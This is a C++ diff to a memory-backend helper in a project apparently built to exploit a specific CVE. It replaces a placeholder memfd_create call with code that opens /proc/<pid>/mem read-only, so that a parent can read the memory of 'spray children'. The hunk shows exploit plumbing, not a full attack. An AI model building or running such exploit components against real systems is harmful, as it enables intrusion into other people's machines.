@@ -11,6 +11,7 @@
  */
 #include <cerrno>
 #include <cstddef>
+#include <cstdio>
 #include <cstdint>
 #include <fcntl.h>
 #include <sched.h>
@@ -30,10 +31,30 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             return SeamResult{static_cast<std::int64_t>(size), errno};
         }
 
+        /** Open the memory of another process, which is what the spray children are for: the
+         *  descriptor keeps their address space alive and is what the parent reads them through.
+         *  The retired tree opened /proc/<pid>/mem read-only, and its clone_memfd helper did so
+         *  before killing the child, which is why a child that leaves at once is not a problem.
+         *  Opening a memfd_create of our own would answer a different question and was a placeholder.
+         *  @param pid  The process whose memory is wanted.
+         *  @return     The descriptor, or a negative value with errno set. A pid of zero, which is
+         *              not a process, is refused before the path is built. */
         static SeamResult open_memfd(std::uint64_t pid) noexcept {
-            (void) pid;
             errno = 0;
-            const int fd = static_cast<int>(::syscall(SYS_memfd_create, "ghostlock", 0U));
+            if (pid == 0U) {
+                errno = EINVAL;
+                return SeamResult{-1, errno};
+            }
+            char path[64] = {};
+            /* Bounded by construction: the widest pid is a uint64 in theory and 20 digits in
+             *  practice, and the literal around it is 11 bytes. */
+            const int written = ::snprintf(path, sizeof(path), "/proc/%llu/mem",
+                                           static_cast<unsigned long long>(pid));
+            if (written <= 0 || static_cast<std::size_t>(written) >= sizeof(path)) {
+                errno = ENAMETOOLONG;
+                return SeamResult{-1, errno};
+            }
+            const int fd = ::open(path, O_RDONLY);
             return SeamResult{static_cast<std::int64_t>(fd), errno};
         }
 
